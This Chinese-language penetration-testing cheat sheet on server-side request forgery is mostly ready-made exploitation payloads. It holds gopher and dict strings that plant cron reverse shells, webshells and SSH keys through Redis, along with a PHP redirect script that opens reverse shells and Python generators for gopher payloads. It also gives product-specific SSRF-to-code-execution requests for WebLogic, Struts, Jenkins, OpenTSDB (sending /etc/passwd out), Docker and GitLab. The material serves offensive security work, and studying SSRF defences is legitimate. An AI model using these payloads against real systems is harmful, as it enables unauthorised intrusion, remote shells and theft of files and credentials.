  #### 定义
	服务端请求伪造
	构造一个由服务器发出请求的漏洞
	服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制
  #### 成因
	file_get_contents()、fsockopen()、curl_exec()、fopen()、readfile()等函数使用不当会造成SSRF漏洞
  #### 挖掘
	转码服务
	在线翻译
	获取超链接的标题等内容进行显示
	请求远程服务器资源的地方，图片加载与下载(通过URL地址加载或下载图片)
	图片、文章收藏功能
	对外发起网络请求的地方，网站采集、网页抓取的地方。
	头像 (远程加载头像)
	一切要你输入网址的地方和可以输入ip的地方。
	数据库内置功能(mongodb的copyDatabase函数)
	邮件系统
	文件处理
	在线处理工具
	从URL关键字中寻找：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain
  #### 利用工具
  	https://github.com/swisskyrepo/SSRFmap
	https://github.com/tarunkant/Gopherus
	https://github.com/In3tinct/See-SURF
	https://github.com/teknogeek/ssrf-sheriff
  #### XML
	<!ENTITY % d SYSTEM "http://wuyun.org/evil.dtd">
	<!ENTITY % file system "file:///etc/passwd" >
	<!ENTITY % d SYSTEM "http://wuyun.org/file?data=%file">
	<!DOCTYPE roottag PUBLIC "-//VSR//PENTEST//EN" "http://wuyun.org/urlin">
	<xenc:AgreementMethod Algorithm= "http://wuyun.org/1">
	<xenc:EncryptionProperty Target= "http://wuyun.org/2">
	<xenc:CipherReference URI= "http://wuyun.org/3">
	<xenc:DataReference URI= "http://wuyun.org/4">
	<Reference URI="http://wuyun.org/5">
	<To xmlns="http://www.w3.org/2005/08/addressing">http://wuyun.org/to</To>
	<ReplyTo xmlns="http://www.w3.org/2005/08/addressing">
	<Address>http://wuyun.org/rto</Address>
	<input message="wooyun" wsa:Action="http://wuyun.org/ip" />
	<output message="wooyun" wsa:Action="http://wuyun.org/op" />
	<wsp:PolicyReference URI=“http://wuyun.org/pr">
	<fed:Federation FederationID="http://wuyun.org/fid">
	<fed:FederationInclude>http://wuyun.org/inc</fed:FederationInclude>
	<fed:TokenIssuerName>http://wuyun.org/iss</fed:TokenIssuerName>
	<mex:MetadataReference>
	<wsa:Address>http://wuyun.org/mex</wsa:Address>
	</mex:MetadataReference>
	<edmx:Reference URI="http://wuyun.org/edmxr">
	<edmx:AnnotationsReference URI="http://wuyun.org/edmxa">
	<xbrli:identifier scheme="http://wuyun.org/xbr">
	<link:roleType roleURI="http://wuyun.org/role">
	<stratml:Source>http://wuyun.org/stml</stratml:Source>
  #### 数据库
  ##### MongoDB
	db.copyDatabase('\r\nconfig set dbfilename ssrf\r\nquit\r\n’,'test','10.6.4.166:6379')
  ##### PostgresSQL
	SELECT dblink_send_query(
	 'host=127.0.0.1 
	dbname=quit 
	user=\'\r\nconfig set dbfilename wyssrf\r\n\quit\r\n' 
	password=1 port=6379 sslmode=disable', 
	'select version();’ 
	);
  ##### MSSQL
	SELECT openrowset('SQLOLEDB', 'server=192.168.1.5;uid=sa;pwd=sa;database=master')
	SELECT * FROM OpenDatasource('SQLOLEDB', 'Data Source=ServerName;User ID=sa;Password=sa' ) .Northwind.dbo.Categories
  ##### 图片处理函数
	FFmpeg
	concat:http://wyssrf.wuyun.org/header.y4m|file:///etc/passwd
	ImageMagick
	fill 'url(http://wyssrf.wuyun.org)'
  #### 攻击
	测试代码,需安装phpcurl模块apt-get install php7.0-curl
	<?php
	echo 'r u ok?';
	function curl($url){  
	  $ch = curl_init();
	  curl_setopt($ch, CURLOPT_URL, $url);
	  curl_setopt($ch, CURLOPT_HEADER, 0);
	  curl_exec($ch);
	  curl_close($ch);
	}
	$url = $_GET['url'];
	curl($url);
	?>
	对内网、本地进行端口扫描，获取服务的banner 信息
	攻击运行在内网或本地的应用程序
	对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件)
	攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)
	读取内网资源(如：利用file协议读取本地文件等)
	跳板
	无视cdn
	利用Redis未授权访问，HTTP CRLF注入实现getshell
  ##### 文件读取
	>curl -v 'http://192.168.0.110/ssrf.php?url=file:///etc/passwd'
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/12.png)

	?url=php://filter/read=convert.base64-encode/resource=./1.php
  #### 端口探测
	>curl -v 'http://www.xx.com/ssrf.php?url=dict://127.0.0.1:22/'
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/13.png)

	>curl -v 'http://www.xx.com/ssrf.php?url=dict://127.0.0.1:6379/info'
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/14.png)
  ###### SSRF+Redis
	>curl -v 'http://192.168.0.112/ssrf.php?url=gopher://192.168.0.120:6379/_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f192.168.0.108%2f12345%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a'
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/15.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/16.png)

	获取webshell
	url=dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
	url=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php
	url=dict://127.0.0.1:6379/SET%20mykey%20"<\x3Fphp system($_GET[0])\x3F>"
	url=dict://127.0.0.1:6379/SAVE

	获取php反向shell
	gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml
	gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php
	gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22
	gopher://127.0.0.1:6379/_save
  ##### 302反弹shell
	?url=http://xxxx/302.php?s=dict&ip=10.20.*.*&port=6379&data=flushall
	302.php
	<?php
	$ip = $_GET['ip'];
	$port = $_GET['port'];
	$scheme = $_GET['s'];
	$data = $_GET['data'];
	header("Location: $scheme://$ip:$port/$data");
	?>
	?url=http://xxxx/reverse.php?s=dict&ip=10.20.*.*&port=6379&bhost=*.*.*.*&bport=1234
	reverse.php
	<?php
	$ip = $_GET['ip'];
	$port = $_GET['port'];
	$bhost = $_GET['bhost'];
	$bport = $_GET['bport'];
	$scheme = $_GET['s'];
	header("Location: $scheme://$ip:$port/set:0:\"\\x0a\\x0a*/1\\x20*\\x20*\\x20*\\x20*\\x20/bin/bash\\x20-i\\x20>\\x26\\x20/dev/tcp/{$bhost}/{$bport}\\x200>\\x261\\x0a\\x0a\\x0a\"");
	?>
	?url=http://xxxx/302.php?s=dict&ip=10.20.*.*&port=6379&data=config:set:dir:/var/spool/cron/
	?url=http://xxxx/302.php?s=dict&ip=10.20.*.*&port=6379&data=config:set:dbfilename:root
	?url=http://xxxx/302.php?s=dict&ip=10.20.*.*&port=6379&data=save
	可设置burp–>intruder指定变量跑。
  ##### Mysql
	https://github.com/FoolMitAh/mysql_gopher_attack
	https://fireshellsecurity.team/isitdtu-friss/
  ##### Weblogic SSRF+Redis
	探测
	/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:80
	Redis反弹
	set 1 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/121.36.67.230/4444 0>&1\n\n\n\n"
	config set dir /etc/
	config set dbfilename crontab
	save
	/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://192.168.0.110:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F121.36.67.230%2F4444%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
	SSRF+内网Struct2
	http://www.xx.com/ssrf.php?url=http://10.1.1.1/action?action?redirect:http://attackerip/
  ##### Ueditor SSRF
	/editor/ueditor/php/controller.php?action=catchimage&source[]=http://my.ip/?aaa=1%26logo.png
  ##### Discuz
	/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://b182oj.ceye.io/xx.jpg[/img]&formhash=xxoo
  ##### 探测存活主机
	直接访问
	http://www.xx.com/ssrf.php?url=http://192.168.0.1
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/17.png)

	伪造POST请求
	>curl -v 'http://www.xx.com/ssrf.php?url=gopher://192.168.0.10:80/_POST%20/post.php%20HTTP/1.1%250d%250aHost:%20192.168.220.139%250d%250aUser-Agent:%20curl/7.42.0%250d%250aAccept:%20*/*%250d%250aContent-Type:%20application/x-www-form-urlencoded%250d%250a%250d%250acmd=bbbbb'
  ##### gopher协议的脚本转换
	抓取本地测试的正常请求
	>socat -v tcp-listen:4444,fork tcp-connect:目标IP:6379
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/18.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/19.png)

	将捕获日志保存txt
	使用脚本转换为支持gopher协议的字符串
	转换规则
	如果第一个字符是>或者< 那么丢弃该行字符串，表示请求和返回的时间。
	如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。
	将\r字符串替换成%0d%0a
	空白行替换为%0a
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/20.png)

	本地可执行
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/21.png)

	远程执行需对空格进行编码后再url编码一次
	*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$63%0d%0a%0a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20>&%20/dev/tcp/192.168.0.108/12138%200>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/22.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/23.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/24.png)
  ##### 协议
	Curl版本需低于7.15.1
	file:可回显时，使用file读取任意文件
	dict:查看端口，操作内网服务
	gopher:可发出get/post请求
	使用gopher协议时，要进行两次url编码
	http/https:探测存活主机
	SFTP：ssrf.php?url=sftp://evil.com:11111/
	TFTP：ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
	LDAP：ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
	netdoc：ssrf.php?url=netdoc:///etc/passwd
  ##### dict协议写shell
	?url=dict://127.0.0.1:6379/set:x:<?php phpinfo();?>
	?url=dict://127.0.0.1:6379/config:set:dir:/www/wwwroot/
	?url=dict://127.0.0.1:6379/config:set:dbfilename:php.php
	?url=dict://127.0.0.1:6379/save
	Unicode编码
	?url=dict://127.0.0.1:6379/set:x:"\x3C\x3Fphp\x20echo `$_GET[x]`\x3B\x3F\x3E"
  ##### slaveof复制shell到目标
	From:http://r3start.net/index.php/2020/05/09/683
	你的redis设置一个shell的键
	Yourredis>FLUSHALL
	Yourredis>set shell "<?php phpinfo();?>"
	?url=dict://127.0.0.1:6379/slaveof:yourredisIP:6379
	?url=dict://127.0.0.1:6379/config:set:dir:/www/wwwroot/
	?url=dict://127.0.0.1:6379/config:set:dbfilename:test.php
	?url=dict://127.0.0.1:6379/save
	?url=dict://127.0.0.1:6379/slaveof:no:one
  ##### slaveof反弹shell
	?url=dict://127.0.0.1:6379/slaveof: yourredisIP:6379
	?url=dict://127.0.0.1:6379/config:set:dbfilename:exp.so
	?url=dict://127.0.0.1:6379/MODULE:LOAD:./exp.so
	?url=dict://127.0.0.1:6379/SLAVEOF:NO:ONE
	?url=dict://127.0.0.1:6379/config:set:dbfilename:dump.rdb
	?url=dict://127.0.0.1:6379/system.exec:'curl x.x.x.x/x'
	?url=dict://127.0.0.1:6379/system.rev:x.x.x.x:8887
  ##### SSRF+PDF
  	<link rel=attachment href="file:///root/secret.txt">
	PhantomJS示例
```javascript
<script>
    exfil = new XMLHttpRequest();
    exfil.open("GET","file:///etc/passwd");
    exfil.send();
    exfil.onload = function(){document.write(this.responseText);}
    exfil.onerror = function(){document.write('failed!')}
</script>
```
  ##### 盲SSRF
  	假设存在一个盲SSRF
  ###### Elasticsearch
  	默认端口：9200
	检查以下端点是否返回 200：
	/_cluster/health
	/_cat/indices
	/_cat/health
	如果存在POST请求的盲SSRF，可以请求以下路径关闭Elasticsearch
	仅适用于 Elasticsearch 1.6 及以下版本
	/_shutdown
	/_cluster/nodes/_master/_shutdown
	/_cluster/nodes/_shutdown
	/_cluster/nodes/_all/_shutdown
  ###### Weblogic
  	默认绑定端口：80、443（SSL）、7001、8888
	CVE-2014-4210
	POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1
	Host: target.com
	Content-Length: 137
	Content-Type: application/x-www-form-urlencoded

	operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
	get请求
	http://target.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
	CRLF 注入
	GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://attacker.com:4000/exp%20HTTP/1.11%0AX-CLRF%3A%20Injected%0A&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search HTTP/1.0
	Host: vuln.weblogic
	Accept-Encoding: gzip, deflate
	Accept: */*
	Accept-Language: en
	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
	Connection: close
	结果
	root@mail:~# nc -lvp 4000
	Listening on [0.0.0.0] (family 0, port 4000)
	Connection from example.com 43111 received!
	POST /exp HTTP/1.11
	X-CLRF: Injected HTTP/1.1
	Content-Type: text/xml; charset=UTF-8
	soapAction: ""
	Content-Length: 418
	User-Agent: Java1.6.0_24
	Host: attacker.com:4000
	Accept: text/html, image/gif, image/jpeg, */*; q=.2
	Connection: Keep-Alive

	<?xml version="1.0" encoding="UTF-8" standalone="yes"?><env:Envelope xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><env:Header/><env:Body><find_business generic="2.0" xmlns="urn:uddi-org:api_v2"><name>sdf</name></find_business></env:Body></env:Envelope>
	CVE-2020-14883
	Linux
	POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
	Host: vulnerablehost:7001
	Upgrade-Insecure-Requests: 1
	User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
	Accept-Encoding: gzip, deflate
	Accept-Language: zh-CN,zh;q=0.9
	Connection: close
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 117

	_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://SSRF_CANARY/poc.xml")
	Windows
	POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
	Host: vulnerablehost:7001
	Upgrade-Insecure-Requests: 1
	User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
	Accept-Encoding: gzip, deflate
	Accept-Language: zh-CN,zh;q=0.9
	Connection: close
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 117

	_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://SSRF_CANARY/poc.xml")
  ###### Hashicorp Consul
  	默认绑定端口：80、443（SSL）、8080
	https://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html
  ###### Shellshock
	默认绑定端口：80、443（SSL）、8080
	CGI路径
	https://gist.github.com/infosec-au/009fcbdd5bad16bb6ceb36b838d96be4
	通过User-Agent的 Shellshock
	User-Agent: () { foo;}; echo Content-Type: text/plain ; echo ;  curl SSRF_CANARY
  ###### Apache Druid
  	如果可以查看状态码，请检查以下路径是否返回 200 状态码
	/status/selfDiscovered/status
	/druid/coordinator/v1/leader
	/druid/coordinator/v1/metadata/datasources
	/druid/indexer/v1/taskStatus
	关闭任务，需要猜测任务 ID 或数据源名称
	/druid/indexer/v1/task/{taskId}/shutdown
	/druid/indexer/v1/datasources/{dataSource}/shutdownAllTasks
	关闭Apache Druid Overlords的supervisors 
	/druid/indexer/v1/supervisor/terminateAll
	/druid/indexer/v1/supervisor/{supervisorId}/shutdown
  ###### Apache Solr
  	默认绑定端口：8983
	/search?q=Apple&shards=http://SSRF_CANARY/solr/collection/config%23&stream.body={"set-property":{"xxx":"yyy"}}
	/solr/db/select?q=orange&shards=http://SSRF_CANARY/solr/atom&qt=/select?fl=id,name:author&wt=json
	/xxx?q=aaa%26shards=http://SSRF_CANARY/solr 
	/xxx?q=aaa&shards=http://SSRF_CANARY/solr
	Solr XXE (2017)
	/solr/gettingstarted/select?q={!xmlparser v='<!DOCTYPE a SYSTEM "http://SSRF_CANARY/xxx"'><a></a>'
	/xxx?q={!type=xmlparser v="<!DOCTYPE a SYSTEM 'http://SSRF_CANARY/solr'><a></a>"}
	通过 dataImportHandler 进行 RCE
	https://github.com/veracode-research/solr-injection#3-cve-2019-0193-remote-code-execution-via-dataimporthandler
  ###### PeopleSoft
  	https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce
	XXE #1
	POST /PSIGW/HttpListeningConnector HTTP/1.1
	Host: website.com
	Content-Type: application/xml
	...

	<?xml version="1.0"?>
	<!DOCTYPE IBRequest [
	<!ENTITY x SYSTEM "http://SSRF_CANARY">
	]>
	<IBRequest>
	   <ExternalOperationName>&x;</ExternalOperationName>
	   <OperationType/>
	   <From><RequestingNode/>
	      <Password/>
	      <OrigUser/>
	      <OrigNode/>
	      <OrigProcess/>
	      <OrigTimeStamp/>
	   </From>
	   <To>
	      <FinalDestination/>
	      <DestinationNode/>
	      <SubChannel/>
	   </To>
	   <ContentSections>
	      <ContentSection>
	         <NonRepudiation/>
	         <MessageVersion/>
	         <Data><![CDATA[<?xml version="1.0"?>your_message_content]]>
	         </Data>
	      </ContentSection>
	   </ContentSections>
	</IBRequest>
	XXE #2
	POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
	Host: website.com
	Content-Type: application/xml
	...

	<!DOCTYPE a PUBLIC "-//B/A/EN" "http://SSRF_CANARY">
  ###### Apache Struts
  	默认绑定端口：80,443 (SSL),8080,8443 (SSL)
	Struts2-016
	?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'command'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://SSRF_CANARY/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}
  ###### JBOSS
  	默认绑定端口：80,443 (SSL),8080,8443 (SSL)
	/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://SSRF_CANARY/utils/cmd.war
  ###### Confluence 
  	默认绑定端口：80,443 (SSL),8080,8443 (SSL)
	2016 年 11 月及之前发布的 Confluence 版本
	/rest/sharelinks/1.0/link?url=https://SSRF_CANARY/
	CVE-2017-9506
	/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
  ###### Jira 
  	默认绑定端口：80,443 (SSL),8080,8443 (SSL)
	CVE-2017-9506
	/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
	CVE-2019-8451
	/plugins/servlet/gadgets/makeRequest?url=https://SSRF_CANARY:443@example.com
  ###### 其他 Atlassian 产品
  	默认绑定端口：80,443 (SSL),8080,8443 (SSL)
	CVE-2017-9506
	/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
  ###### OpenTSDB
  	默认绑定端口：4242
	https://packetstormsecurity.com/files/136753/OpenTSDB-Remote-Code-Execution.html
	curl via RCE
	/q?start=2016/04/13-10:21:00&ignore=2&m=sum:jmxdata.cpu&o=&yrange=[0:]&key=out%20right%20top&wxh=1900x770%60curl%20SSRF_CANARY%60&style=linespoint&png
	CVE-2020-35476
	/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('wget%20--post-file%20/etc/passwd%20SSRF_CANARY')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json
  ###### Jenkins
  	CVE-2018-1000600
	/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://SSRF_CANARY/%23&login=orange&password=tsai
	RCE
	/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name='orange.tw', root='http://SSRF_CANARY/')%0a@Grab(group='tw.orange', module='poc', version='1')%0aimport Orange;
	通过 Groovy 进行 RCE
	cmd = 'curl burp_collab'
	pay = 'public class x {public x(){"%s".execute()}}' % cmd
	data = 'http://jenkins.internal/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=' + urllib.quote(pay)
  ###### Hystrix
  	默认绑定端口：80,443 (SSL),8080
	CVE-2020-5412
	/proxy.stream?origin=http://SSRF_CANARY/
  ###### W3 Total Cache
  	默认绑定端口：80,443 (SSL)
	CVE-2019-6715
	PUT /wp-content/plugins/w3-total-cache/pub/sns.php HTTP/1.1
	Host: {{Hostname}}
	Accept: */*
	User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36
	Content-Length: 124
	Content-Type: application/x-www-form-urlencoded
	Connection: close

	{"Type":"SubscriptionConfirmation","Message":"","SubscribeURL":"https://SSRF_CANARY"}
	https://klikki.fi/adv/w3_total_cache.html
	<?php

	$url='http://www.google.com';
	$file=strtr(base64_encode(gzdeflate($url.'#https://ajax.googleapis.com')), '+/=', '-_');
	$file=chop($file,'=');
	$req='/wp-content/plugins/w3-total-cache/pub/minify.php?file='.$file.'.css';
	echo($req);

	?>
  ###### Docker
  	使用以下路径来验证 Docker 的 API 的存在
	/containers/json
	/secrets
	/services
	RCE
	POST /containers/create?name=test HTTP/1.1
	Host: website.com
	Content-Type: application/json
	...

	{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}
  ###### Gitlab Prometheus Redis Exporter
  	默认绑定端口：9121
	影响版本 13.1.1 之前的 Gitlab 实例
	以下端点将允许攻击者转储通过 target 参数提供的 redis 服务器中的所有密钥：
	http://localhost:9121/scrape?target=redis://127.0.0.1:7001&check-keys=*
  ###### Redis
  	计划任务RCE
  	redis-cli -h $1 flushall
	echo -e "\n\n*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1\n\n"|redis-cli -h $1 -x set 1
	redis-cli -h $1 config set dir /var/spool/cron/
	redis-cli -h $1 config set dbfilename root
	redis-cli -h $1 save

	gopher
	gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a

	上传shell
	https://www.mdeditor.tw/pl/pBy0
```python
#!/usr/bin/env python
# -*-coding:utf-8-*-

import urllib
protocol="gopher://"
ip="192.168.189.208"
port="6379" 
shell="\n\n<?php phpinfo();?>\n\n"
filename="shell.php"
path="/var" 
passwd=""

cmd=["flushall",
     "set 1 {}".format(shell.replace(" ","${IFS}")),
     "config set dir {}".format(path),
     "config set dbfilename {}".format(filename),
     "save"
     ]
if passwd:
    cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
    cmd+=CRLF
    return cmd

if __name__=="__main__":
    for x in cmd:
        payload += urllib.quote(redis_format(x))
    print payload
```
	authorized_keys
```python
import urllib
protocol="gopher://"
ip="192.168.189.208"
port="6379"
# shell="\n\n<?php eval($_GET[\"cmd\"]);?>\n\n"
sshpublic_key = "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8IOnJUAt5b/5jDwBDYJTDULjzaqBe2KW3KhqlaY58XveKQRBLrG3ZV0ffPnIW5SLdueunb4HoFKDQ/KPXFzyvVjqByj5688THkq1RJkYxGlgFNgMoPN151zpZ+eCBdFZEf/m8yIb3/7Cp+31s6Q/DvIFif6IjmVRfWXhnkjNehYjsp4gIEBiiW/jWId5yrO9+AwAX4xSabbxuUyu02AQz8wp+h8DZS9itA9m7FyJw8gCrKLEnM7PK/ClEBevDPSR+0YvvYtnUxeCosqp9VrjTfo5q0nNg9JAvPMs+EA1ohUct9UyXbTehr1Bdv4IXx9+7Vhf4/qwle8HKali3feIZ root@kali\n\n"
filename="authorized_keys"
path="/root/.ssh/"
passwd=""
cmd=["flushall",
     "set 1 {}".format(sshpublic_key.replace(" ","${IFS}")),
     "config set dir {}".format(path),
     "config set dbfilename {}".format(filename),
     "save"
     ]
if passwd:
    cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
    cmd+=CRLF
    return cmd

if __name__=="__main__":
    for x in cmd:
        payload += urllib.quote(redis_format(x))
    print payload
```
  ###### 通过 Git 协议在 GitLab 上进行 RCE
  git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
  ###### Memcache
  	默认绑定端口：11211
	https://www.exploit-db.com/exploits/37815
	https://www.exploit-db.com/exploits/42392
	https://blog.safebuff.com/2016/07/03/SSRF-Tips/#SSRF-memcache-Getshell
